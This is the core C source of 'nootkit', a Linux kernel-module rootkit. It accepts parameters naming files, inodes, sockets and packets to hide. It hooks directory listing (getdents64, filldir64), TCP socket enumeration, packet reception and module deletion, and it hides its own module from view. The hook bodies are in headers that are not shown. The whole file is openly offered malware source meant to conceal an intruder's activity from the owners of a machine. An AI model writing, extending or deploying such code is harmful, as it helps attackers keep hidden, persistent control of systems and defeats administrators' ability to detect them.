#include <linux/export.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/printk.h>
#include <linux/errno.h>

#include <license.h>
#include <ksyms.h>
#include <config.h>
#include <hide.h>

static unsigned long kallsyms_lookup_name_addr;
module_param_named(kallsyms_lookup_name, kallsyms_lookup_name_addr, ulong, 0);

char *hide_filenames[MAX_HIDE_ENTITIES];
int hide_filenames_count;
module_param_array(hide_filenames, charp, &hide_filenames_count, 0);

unsigned long hide_inodes[MAX_HIDE_ENTITIES];
int hide_inodes_count;
module_param_array(hide_inodes, ulong, &hide_inodes_count, 0);

char *hide_sockets_strs[MAX_HIDE_ENTITIES];
int hide_sockets_count;
module_param_array_named(hide_sockets, hide_sockets_strs, charp, &hide_sockets_count, 0);

char *hide_packets_strs[MAX_HIDE_ENTITIES];
int hide_packets_count;
module_param_array_named(hide_packets, hide_packets_strs, charp, &hide_packets_count, 0);

/// @brief Enable all nootkit hooks
/// @returns 0 on success, or -errno if any hook failed to set
static int enable_all_hooks(void)
{
    if (hide_hook_enable_filldir64()
    || hide_hook_enable_tcp_seq_next()
    || hide_hook_enable_netif_receive_skb_list()) {
        return -ENOMEM;
    }

    hide_hook_enable_getdents64();
    hide_hook_enable_delete_module();
    
    return 0;
}

static void disable_all_hooks(void)
{
    hide_hook_disable_getdents64();
    hide_hook_disable_filldir64();
    hide_hook_disable_tcp_seq_next();
    hide_hook_disable_netif_receive_skb_list();
    hide_hook_disable_delete_module();
}

int nootkit_init(void)
{
    int res;

    if (config_parse_globals()) {
        printk(KERN_ERR "nootkit: Configuration parsing failed, aborting");
        return -EINVAL;
    }

    if (!kallsyms_lookup_name_addr) {
        printk(KERN_ERR "nootkit: kallsyms_lookup_name address not supplied, aborting");
        return -EINVAL;
    }

    if (resolve_ksyms((void *)kallsyms_lookup_name_addr)) {
        printk(KERN_ERR "nootkit: Failed to find all required kernel symbols, aborting");
        return -EFAULT;
    }
    
    res = enable_all_hooks();
    if (res) {
        printk(KERN_ERR "nootkit: Failed to set all hooks, aborting");
        disable_all_hooks();
        return res;
    }

    // no need to call disable for this hide, see it's description
    hide_enable_thismodule();

    printk(KERN_INFO "nootkit: Initialized!\n");

    return 0;
}


void nootkit_exit(void)
{
    disable_all_hooks();
    printk(KERN_INFO "nootkit: Unloaded!\n");
}

module_init(nootkit_init);
module_exit(nootkit_exit);
